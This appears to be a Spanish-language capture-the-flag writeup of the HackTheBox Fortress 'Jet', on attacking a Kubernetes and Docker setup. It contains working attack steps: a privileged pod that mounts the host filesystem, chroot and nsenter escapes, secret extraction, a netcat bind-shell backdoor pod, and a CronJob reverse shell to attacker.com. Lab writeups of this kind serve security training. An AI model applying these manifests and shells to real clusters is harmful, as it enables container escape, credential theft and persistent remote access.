---
title: "Jet - HackTheBox Fortress"
description: "Writeup del Fortress Jet de HackTheBox, un laboratorio avanzado de pentesting enfocado en infraestructura cloud y contenedores."
pubDate: 2024-11-02
platform: "htb"
category: "fortresses"
difficulty: "hard"
os: "linux"
language: es
tags: ["kubernetes", "docker", "cloud-security", "container-escape", "api-exploitation"]
logo: "/images/writeups/htb/jet/logo.png"
heroImage: "/images/writeups/htb/jet/card.png"
retired: false
estimatedTime: "6-8 horas"
points: 80
attackVectors: ["web", "cloud", "active-directory"]
certifications: ["OSCP", "OSWE"]
vulnerabilities: ["jet"]
---

# Jet - HackTheBox Fortress

**Dificultad**: Hard  
**OS**: Linux  
**Plataforma**: HackTheBox  
**Categoría**: Fortress

## Introducción

Jet es un Fortress de HackTheBox que simula una infraestructura cloud moderna basada en Kubernetes y Docker. Este laboratorio está diseñado para practicar técnicas de seguridad en contenedores y orquestación.

## Reconocimiento

### Escaneo de Servicios

```bash
nmap -sV -sC -p- 10.10.10.200
```

**Puertos abiertos:**
- 22/tcp (SSH)
- 80/tcp (HTTP - Nginx)
- 443/tcp (HTTPS)
- 6443/tcp (Kubernetes API)
- 8080/tcp (Docker Registry)

### Enumeración Web

```bash
ffuf -u https://10.10.10.200/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Encontramos:
- `/api/v1` - API REST
- `/health` - Health check endpoint
- `/metrics` - Prometheus metrics

## Explotación Inicial

### API Misconfiguration

Descubrimos que la API de Kubernetes está mal configurada:

```bash
curl -k https://10.10.10.200:6443/api/v1/namespaces
```

Podemos enumerar recursos sin autenticación.

### Container Deployment

Creamos un pod malicioso para obtener acceso:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: malicious-pod
spec:
  containers:
  - name: attacker
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "while true; do sleep 30; done;"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
```

### Container Escape

```bash
kubectl exec -it malicious-pod -- /bin/sh
chroot /host
```

Obtenemos acceso al host subyacente.

## Movimiento Lateral

### Docker Registry Exploitation

```bash
curl http://10.10.10.200:8080/v2/_catalog
```

Descargamos imágenes Docker que contienen credenciales hardcodeadas.

### Secret Extraction

```bash
kubectl get secrets -n kube-system -o yaml
```

Extraemos tokens de servicio y certificados.

## Escalada de Privilegios

### Node Compromise

Abusamos de permisos privilegiados del contenedor:

```bash
# Desde el contenedor privilegiado
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

### Cluster Admin Access

```bash
kubectl --token=<extracted_token> get nodes
kubectl --token=<extracted_token> get pods --all-namespaces
```

## Persistencia

### Backdoor Container

Desplegamos un contenedor backdoor:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: backdoor
  namespace: kube-system
spec:
  containers:
  - name: backdoor
    image: alpine
    command: ["/bin/sh", "-c"]
    args: ["nc -lvp 4444 -e /bin/sh"]
  hostNetwork: true
```

### CronJob Persistence

```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: reverse-shell
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: shell
            image: alpine
            command: ["/bin/sh", "-c"]
            args: ["nc attacker.com 443 -e /bin/sh"]
```

## Flags

- **User Flag**: En `/home/developer/user.txt` dentro del pod
- **Root Flag**: En `/root/root.txt` del host
- **Bonus Flag 1**: En el ConfigMap de producción
- **Bonus Flag 2**: En un Secret de kube-system

## Conclusión

Jet es un excelente laboratorio para aprender:
- Seguridad en Kubernetes
- Container escape techniques
- API exploitation
- Cloud security best practices

**Skills Aprendidas**:
- Kubernetes enumeration
- Container breakout
- Docker registry exploitation
- Secret extraction
- Privilege escalation in containerized environments

**Recomendaciones**:
- Estudiar Kubernetes RBAC
- Practicar container hardening
- Aprender sobre network policies
- Familiarizarse con herramientas como kube-hunter
